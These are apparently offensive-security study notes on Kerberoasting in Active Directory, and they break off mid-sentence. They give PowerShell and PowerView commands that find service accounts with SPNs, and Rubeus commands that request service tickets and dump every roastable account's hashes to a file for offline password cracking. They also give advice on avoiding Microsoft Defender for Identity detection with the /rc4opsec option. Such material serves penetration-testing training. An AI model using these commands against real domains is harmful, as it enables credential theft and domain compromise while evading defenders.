**Let think of scenario's where there where no service or paths, how can we escalate privileges in an active directory environment, what are other opportunities/ways we can go about it ??**

# **Kerberoast**


![](https://i.imgur.com/ruStWfi.png)



- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!


**_Example -:_**


- Find user accounts used as Service accounts


```powershell
# AD Module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView

Get-DomainUser -SPN
```

> **Hint :** When you run `klist`, the SPN can be identified as the name of the {service/machine name}


![](https://i.imgur.com/S7sx0zM.png)



Use Rubeus to list Kerberoast stats
Rubeus.exe kerberoast /stats
• Use Rubeus to request a TGS
Rubeus.exe kerberoast /user:svcadmin /simple
• To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of
MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support
RC4_HMAC
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
• Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt


> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't 
